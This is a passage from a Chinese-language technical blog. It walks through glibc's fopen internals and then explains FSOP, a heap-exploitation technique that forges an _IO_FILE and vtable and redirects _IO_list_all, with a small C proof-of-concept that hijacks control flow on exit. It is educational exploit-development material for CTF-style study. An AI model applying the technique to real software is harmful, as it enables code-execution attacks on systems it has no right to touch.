class="hljs-type">char</span> *cs;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *last_recognized;<br><br>  <span class="hljs-keyword">if</span> (_IO_file_is_open (fp))<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">switch</span> (*mode)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>      omode = O_RDONLY;<br>      read_write = _IO_NO_WRITES;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_TRUNC;<br>      read_write = _IO_NO_READS;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_APPEND;<br>      read_write = _IO_NO_READS|_IO_IS_APPENDING;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  last_recognized = mode;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">7</span>; ++i)<br>    &#123;<br>      <span class="hljs-keyword">switch</span> (*++mode)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\0&#x27;</span>:<br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>  omode = O_RDWR;<br>  read_write &amp;= _IO_IS_APPENDING;<br>  last_recognized = mode;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>  oflags |= O_EXCL;<br>  last_recognized = mode;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>  last_recognized = mode;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;m&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br>  oflags |= O_CLOEXEC;<br>  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br>  <span class="hljs-comment">/* Ignore.  */</span><br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,<br>  is32not64);<br><br>  <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Test whether the mode string specifies the conversion.  */</span><br>      cs = <span class="hljs-built_in">strstr</span> (last_recognized + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;,ccs=&quot;</span>);<br>      <span class="hljs-keyword">if</span> (cs != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-comment">/* Yep.  Load the appropriate conversions and set the orientation</span><br><span class="hljs-comment">     to wide.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gconv_fcts</span> <span class="hljs-title">fcts</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span>;</span><br>  <span class="hljs-type">char</span> *endp = __strchrnul (cs + <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;,&#x27;</span>);<br>  <span class="hljs-type">char</span> *ccs = <span class="hljs-built_in">malloc</span> (endp - (cs + <span class="hljs-number">5</span>) + <span class="hljs-number">3</span>);<br><br>  <span class="hljs-keyword">if</span> (ccs == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-type">int</span> malloc_err = errno;  <span class="hljs-comment">/* Whatever malloc failed with.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      __set_errno (malloc_err);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  *((<span class="hljs-type">char</span> *) __mempcpy (ccs, cs + <span class="hljs-number">5</span>, endp - (cs + <span class="hljs-number">5</span>))) = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  strip (ccs, ccs);<br><br>  <span class="hljs-keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span><br>   ? upstr (ccs, cs + <span class="hljs-number">5</span>) : ccs) != <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Something went wrong, we cannot load the conversion modules.</span><br><span class="hljs-comment"> This means we cannot proceed since the user explicitly asked</span><br><span class="hljs-comment"> for these.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      <span class="hljs-built_in">free</span> (ccs);<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-built_in">free</span> (ccs);<br><br>  assert (fcts.towc_nsteps == <span class="hljs-number">1</span>);<br>  assert (fcts.tomb_nsteps == <span class="hljs-number">1</span>);<br><br>  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;<br>  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;<br><br>  <span class="hljs-comment">/* Clear the state.  We start all over again.  */</span><br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br><br>  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;<br><br>  cc-&gt;__cd_in.step = fcts.towc;<br><br>  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_in.step_data.__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;<br>  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  cc-&gt;__cd_out.step = fcts.tomb;<br><br>  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_out.step_data.__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;<br>  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  <span class="hljs-comment">/* From now on use the wide character callback functions.  */</span><br>  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;<br><br>  <span class="hljs-comment">/* Set the mode now.  */</span><br>  result-&gt;_mode = <span class="hljs-number">1</span>;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br>libc_hidden_ver (_IO_new_file_fopen, _IO_file_fopen)<br></code></pre></td></tr></table></figure><p>这个函数，首先检查了是否正常打开文件，紧接着对<strong>omode</strong>和<strong>oflags</strong>进行了设置，即文件权限相关设置。直接进入<code>_IO_file_open</code>查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L180</span><br>FILE *<br>_IO_file_open (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> posix_mode, <span class="hljs-type">int</span> prot,<br>       <span class="hljs-type">int</span> read_write, <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> fdesc;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))<br>    fdesc = __open_nocancel (filename,<br>     posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br>  <span class="hljs-keyword">else</span><br>    fdesc = __open (filename, posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br>  <span class="hljs-keyword">if</span> (fdesc &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_fileno = fdesc;<br>  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);<br>  <span class="hljs-comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span><br><span class="hljs-comment">     update the offset cache though, since the file handle is not active.  */</span><br>  <span class="hljs-keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))<br>      == (_IO_IS_APPENDING | _IO_NO_READS))<br>    &#123;<br>      <span class="hljs-type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="hljs-number">0</span>, _IO_seek_end);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)<br>&#123;<br>  __close_nocancel (fdesc);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>    &#125;<br>  _IO_link_in ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br>libc_hidden_def (_IO_file_open)<br></code></pre></td></tr></table></figure><p>首先会根据<strong>flag2</strong>决定调用<code>__open_nocancel</code>或<code>open</code>。打开文件后利用<code>_IO_mask_flags</code>重新初始化<strong>fp-&gt;flag</strong>,随后调用<code>_IO_link_in</code>初始化chain域，下面是<code>_IO_mask_flags</code>和<code>_IO_link_in</code>的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L518</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_mask_flags(fp, f, mask) \</span><br><span class="hljs-meta">       ((fp)-&gt;_flags = ((fp)-&gt;_flags &amp; ~(mask)) | ((f) &amp; (mask)))</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L86</span><br><span class="hljs-type">void</span><br>_IO_link_in (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (FILE *) fp;<br>      _IO_flockfile ((FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      fp-&gt;file._chain = (FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>回到<code>__fopen_internal</code>函数中，可以看到接下来调用了<code>__fopen_maybe_mmap</code>，由注释我们可知，这里是根据文件的权限，做一些mmap的处理，然后返回即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L34</span><br>FILE *<br>__fopen_maybe_mmap (FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _G_HAVE_MMAP</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))<br>    &#123;<br>      <span class="hljs-comment">/* Since this is read-only, we might be able to mmap the contents</span><br><span class="hljs-comment"> directly.  We delay the decision until the first read attempt by</span><br><span class="hljs-comment"> giving it a jump table containing functions that choose mmap or</span><br><span class="hljs-comment"> vanilla file operations and reset the jump table accordingly.  */</span><br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_mode &lt;= <span class="hljs-number">0</span>)<br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;<br>      <span class="hljs-keyword">else</span><br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;<br>      fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后调用了<code>_IO_un_link</code>进行将该文件进行解链操作，随后free掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/genops.c#L52</span><br><span class="hljs-type">void</span><br>_IO_un_link (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)<br>    &#123;<br>      FILE **f;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (FILE *) fp;<br>      _IO_flockfile ((FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (_IO_list_all == <span class="hljs-literal">NULL</span>)<br>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp == _IO_list_all)<br>_IO_list_all = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;<br>      <span class="hljs-keyword">else</span><br><span class="hljs-keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)<br>  <span class="hljs-keyword">if</span> (*f == (FILE *) fp)<br>    &#123;<br>      *f = fp-&gt;file._chain;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>      fp-&gt;file._flags &amp;= ~_IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_un_link)<br></code></pre></td></tr></table></figure><p>这就是fopen的整个过程了，这里我们小小总结一下流程：</p><ul><li>首先利用<code>malloc</code>创建包含<code>_IO_FILE_plus</code>和<code>_IO_wide_data</code>的<code>locked_FILE</code>结构体</li><li>接着调用<code>_IO_no_init</code>函数对<code>_IO_FILE</code>的主要几个成员变量进行了初始化，以及<code>_wide_data</code>相关值做初始化</li><li>赋值虚表给vtable</li><li>调用<code>_IO_new_file_init_internal</code>进一步初始化，主要是对**_chain**进行操作</li><li>调用<code>_IO_file_fopen</code>打开文件</li><li>根据文件的权限，用<code>__fopen_maybe_mmap</code>做一些可能的mmap操作</li><li>脱离单链表链</li><li>free</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IO_FILE】FSOP</title>
    <link href="/2022/11/25/%E3%80%90IO_FILE%E3%80%91FSOP/"/>
    <url>/2022/11/25/%E3%80%90IO_FILE%E3%80%91FSOP/</url>
    
    <content type="html"><![CDATA[<blockquote><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。另外由于网络上很多IO_FILE相关博客含有相关glibc源代码，但是并没有源代码的完整部分或者链接。在之后的博客中，我会包含该段代码在哪里可以查看得到。</p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685</span><br><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/article/fsop/abort_routine.001.jpeg" alt="img"></p><p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ul><li>当 libc 执行 abort 流程时</li><li>当执行 exit 函数时</li><li>当执行流从 main 函数返回时</li></ul><h2 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h2><p>梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为<code>_IO_list_all </code>是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写<code>_IO_list_all</code>。</p><p>之后需要用任意地址写把<code>_IO_list_all</code> 的内容改为指向我们可控内存的指针，</p><p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br></code></pre></td></tr></table></figure><p>这里其实是两个条件二选一</p><ol><li>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt; _IO_write_ptr &gt; fp-&gt; _IO_write_base</li><li>_IO_vtable_offset (fp) &#x3D;&#x3D; 0 &amp;&amp; fp-&gt; _mode &gt; 0 &amp;&amp; (fp-&gt;wide_data-&gt; _IO_write_ptr &gt; fp-&gt; _wide_data-&gt; _IO_write_base)</li></ol><p>但是vtable显然不会设置为0，那么就要满足条件1，拆分出来两个部分</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0 </li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base</li></ul><p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和 _IO_FILE_plus。 为了绕过验证，我们提前获得了 _IO_write_ptr、 _IO_write_base、 _mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<br><br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br><br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的 _IO_overflow 指针。</p><p>之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的 _IO_FILE_plus。</p><p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush 获取 _IO_list_all 的值并取出作为 _IO_FILE_plus 调用其中的 _IO_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">---&gt; call _IO_overflow<br>[#<span class="hljs-number">0</span>] <span class="hljs-number">0x7ffff7a89193</span> → Name: _IO_flush_all_lockp(do_lock=<span class="hljs-number">0x0</span>)<br>[#<span class="hljs-number">1</span>] <span class="hljs-number">0x7ffff7a8932a</span> → Name: _IO_cleanup()<br>[#<span class="hljs-number">2</span>] <span class="hljs-number">0x7ffff7a46f9b</span> → Name: __run_exit_handlers(status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=<span 